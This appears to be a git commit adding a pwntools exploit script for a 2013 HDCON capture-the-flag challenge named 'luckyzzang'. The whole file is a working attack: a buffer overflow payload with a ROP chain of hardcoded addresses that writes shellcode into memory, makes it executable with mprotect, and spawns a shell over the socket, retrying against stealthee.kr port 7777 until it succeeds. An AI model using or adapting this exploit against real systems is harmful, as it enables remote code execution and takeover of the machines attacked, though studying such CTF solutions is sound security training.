9633a4e99c66d653832a7919f4d4a4def0981bb2
DelspoN <delsponn@gmail.com>
2017-08-09 20:20:31 +0900

    exploit using shellcode added

---
+++ 2013_hdcon/luckyzzang/ass01_shellcode.py
@@ -0,0 +1,63 @@
+from pwn import *
+import sys, time
+
+if (len(sys.argv) != 2):
+	print "input cmd"
+	exit()
+
+ret = 0x80484bb
+popret = 0x80484dc
+pop2ret = 0x80486a2
+pop4ret = 0x80489cc
+pop3ret = 0x804878d
+recv_plt = 0x080485F0
+recv_got = 0x0804A040
+send_plt = 0x08048610
+puts_plt = 0x08048550
+puts_got = 0x0804A018
+data = 0xf7ffd000
+func = 0x080486F3
+system = 0xf7e4bda0
+
+libcbase = 0xf7e11000
+mprotect = libcbase+0xe2d50
+
+shellcode  = ""
+shellcode += shellcraft.i386.linux.dupio(4)
+shellcode += shellcraft.i386.linux.sh()
+shellcode  = asm(shellcode)
+
+payload ="a"*(0x408+4)
+payload+=p32(recv_plt)		# write shellcode in data section
+payload+=p32(pop4ret)
+payload+=p32(4)
+payload+=p32(data)
+payload+=p32(len(shellcode))
+payload+=p32(0)
+payload+=p32(send_plt)
+payload+=p32(pop4ret)
+payload+=p32(4)
+payload+=p32(data)
+payload+=p32(len(shellcode))
+payload+=p32(0)
+payload+=p32(mprotect)
+payload+=p32(data)
+payload+=p32(data)
+payload+=p32(0xff)
+payload+=p32(0x7)
+
+while True:
+	s = connect("stealthee.kr", 7777)
+	try:
+		s.recv()
+		s.send(payload)
+		time.sleep(0.5)
+		s.send(shellcode)
+		s.send(sys.argv[1])
+		s.recv()
+		log.info("SUCCESSFUL TO EXPLOIT")
+		break
+	except Exception as e:
+		s.close()
+		continue
+s.interactive()
